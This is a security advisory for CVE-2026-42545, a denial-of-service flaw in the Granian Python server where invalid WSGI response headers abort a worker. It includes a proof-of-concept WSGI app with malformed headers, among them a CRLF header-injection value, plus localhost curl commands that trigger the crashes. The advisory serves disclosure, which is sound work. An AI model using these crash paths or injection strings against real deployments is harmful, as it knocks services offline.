# [M] Granian vulnerable to DoS via WSGI response header panic

## Summary
Severity: Medium
Advisory: GHSA-f5p7-9fr5-8jmj
CVE: CVE-2026-42545
CWE: CWE-248, CWE-755
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-f5p7-9fr5-8jmj
Type: github-advisory

## Affected
- PyPI: `granian` — affected >=0.2.0 <2.7.4

## Details
### Summary

Granian aborts a worker process if a WSGI application returns an invalid HTTP response header name or value. The WSGI response conversion path uses `.unwrap()` on both the header name and header value constructors, so malformed output from the application becomes a process abort instead of a handled error.

This issue requires a buggy or attacker-influenced WSGI application to emit invalid headers. It is not a parser bug in Granian's request path. The security impact is that application mistakes which should result in a `500` instead kill the worker process.

### Details

https://github.com/emmett-framework/granian/blob/bdd5b0fbbb2aca6f2f4c0d2700c244d190958035/src/wsgi/io.rs#L39-L42

If either conversion fails, `.unwrap()` panics. In release builds Granian uses `panic = "abort"`, so the panic terminates the worker.


#### Preconditions

The attacker must be able to influence a header name or value produced by the WSGI application, or the application must otherwise generate invalid headers.

Examples include:

- a header name containing a space
- a header value containing `\r\n`
- a header value containing a null byte

These are realistic failure modes for applications that reflect user-controlled data into headers such as `Location`, `Content Disposition`, or custom response headers.

### PoC

#### Step 1

start Granian with the PoC WSGI app

```python
# app.py
def app(environ, start_response):
    path = environ.get("PATH_INFO", "/")
    if path == "/crash-name":
        headers = [("X Bad Name", "value")]
    elif path == "/crash-value":
        headers = [("Content-Type", "text/html\r\nX-Injected: evil")]
    elif path == "/crash-null":
        headers = [("X-Custom", "value\x00end")]
    else:
        start_response("200 OK", [("Content-Type", "text/plain")])
        return [b"OK - server alive\n"]

    start_response("200 OK", headers)
    return [b"This response kills the worker\n"]

```

```bash
granian --interface wsgi app:app --host 127.0.0.1 --port 8000
```

#### Step 2

trigger the crash (any one of these is sufficient)

```bash
curl http://127.0.0.1:8000/crash-name
curl http://127.0.0.1:8000/crash-value
curl http://127.0.0.1:8000/crash-null
```


Expected result:

- the worker aborts after any of the crash paths
- subsequent requests fail until the worker is restarted


### Impact

- Worker process denial of service
- A single bad response kills one worker
- Application bugs become process crashes instead of request-scoped failures

## References
- https://github.com/emmett-framework/granian/security/advisories/GHSA-f5p7-9fr5-8jmj
- https://nvd.nist.gov/vuln/detail/CVE-2026-42545
- https://github.com/emmett-framework/granian
